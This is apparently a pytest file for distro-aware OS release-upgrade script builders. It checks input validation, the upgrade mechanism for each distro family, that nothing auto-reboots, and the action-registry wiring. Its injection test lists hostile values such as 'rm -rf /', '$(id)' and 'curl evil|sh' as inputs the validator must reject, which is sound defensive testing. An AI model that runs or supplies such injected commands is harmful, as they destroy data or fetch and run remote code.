"""Tests for the OS Release Upgrade command builders (client/_api_automation.py)
and their action-registry wiring (webgui/actions.py).

The builders emit distro-aware major/distribution-upgrade scripts (Leapp, dnf
system-upgrade, do-release-upgrade, zypper migration/dup). These tests pin the
three things that matter: the `target` value can never inject shell, every
supported distro family gets its correct mechanism, and nothing auto-reboots.
"""
import shutil
import subprocess

import pytest

import client._api_automation as a
import webgui.actions as actions


# --- target validation / injection -------------------------------------
@pytest.mark.parametrize("bad", [
    "9; rm -rf /", "$(id)", "9 && curl evil|sh", "a b", "`id`", 'x"y',
    "9|whoami", "../../etc", "9\nreboot", "9$IFS",
])
def test_target_rejects_injection(bad):
    with pytest.raises(ValueError):
        a.cmd_release_upgrade(bad)
    with pytest.raises(ValueError):
        a.cmd_release_upgrade_check(bad)


@pytest.mark.parametrize("good", ["", "9", "9.4", "40", "15.6", "noble", "8", "42.3"])
def test_target_accepts_real_versions(good):
    # Must not raise; the value (when present) is embedded verbatim.
    up = a.cmd_release_upgrade(good)
    if good:
        assert f'TARGET="{good}"' in up


# --- mechanism coverage per distro family -------------------------------
def test_upgrade_covers_every_supported_family():
    s = a.cmd_release_upgrade("9.4")
    # RHEL family -> Leapp
    assert "leapp upgrade" in s
    # Fedora -> dnf system-upgrade
    assert "dnf -y system-upgrade download" in s
    # Ubuntu -> do-release-upgrade
    assert "do-release-upgrade -f DistUpgradeViewNonInteractive" in s
    # Debian -> guidance, explicitly NOT automated
    assert "Debian has no do-release-upgrade" in s
    # openSUSE Tumbleweed (rolling) + Leap (releasever) -> zypper dup
    assert "zypper --non-interactive dup" in s
    assert 'zypper --releasever="$TARGET" --non-interactive dup' in s
    # SLES -> zypper migration
    assert "zypper --non-interactive migration" in s


def test_assess_and_upgrade_differ_only_by_mode():
    # It's ONE mode-parameterized script: every family branch guards its
    # destructive step behind `if [ "$MODE" = assess ]`, and the top-level
    # MODE= line is the only thing that changes between the two entry points.
    # So the read-only forms (leapp preupgrade, do-release-upgrade -c, dup
    # --dry-run) run iff MODE=assess — enforced at runtime, not by text.
    chk = a.cmd_release_upgrade_check("15.6")
    up = a.cmd_release_upgrade("15.6")
    assert chk.splitlines()[0] == "MODE=assess"
    assert up.splitlines()[0] == "MODE=upgrade"
    assert chk.splitlines()[1:] == up.splitlines()[1:]
    # the assessment-only forms are present and guarded by the assess branch
    for form in ("leapp preupgrade", "do-release-upgrade -c", "dup --dry-run"):
        assert form in chk
        assert '[ "$MODE" = assess ]' in chk


# --- no auto-reboot -----------------------------------------------------
def _committing_lines(script):
    """Lines that would actually execute (strip blanks/comments)."""
    for raw in script.splitlines():
        line = raw.strip()
        if line and not line.startswith("#"):
            yield line


@pytest.mark.parametrize("fn", ["cmd_release_upgrade", "cmd_release_upgrade_check"])
def test_never_auto_reboots(fn):
    script = getattr(a, fn)("40")
    for line in _committing_lines(script):
        # `shutdown`/`reboot` may only appear as text the operator is told to run,
        # i.e. inside an echo — never as a command the script itself executes.
        if "shutdown" in line or "system-upgrade reboot" in line:
            assert line.startswith("echo "), f"would auto-reboot: {line!r}"


# --- generated scripts are valid shell ----------------------------------
@pytest.mark.skipif(not shutil.which("bash"), reason="bash not available")
@pytest.mark.parametrize("target", ["", "9.4", "40", "15.6", "noble"])
def test_generated_scripts_are_syntactically_valid(target):
    for script in (a.cmd_release_upgrade(target), a.cmd_release_upgrade_check(target)):
        r = subprocess.run(["bash", "-n", "-c", script], capture_output=True, text=True)
        assert r.returncode == 0, r.stderr


# --- registry wiring ----------------------------------------------------
def test_actions_registered_and_ordered():
    cat = {t["tool"]: t["actions"] for t in actions.catalog()}
    assert "OS Release Upgrade" in cat
    names = [x["name"] for x in cat["OS Release Upgrade"]]
    # assessment is listed first (operators should run it before upgrading)
    assert names == ["relup_check", "relup_run"]
    danger = {x["name"]: x["danger"] for x in cat["OS Release Upgrade"]}
    assert danger == {"relup_check": False, "relup_run": True}
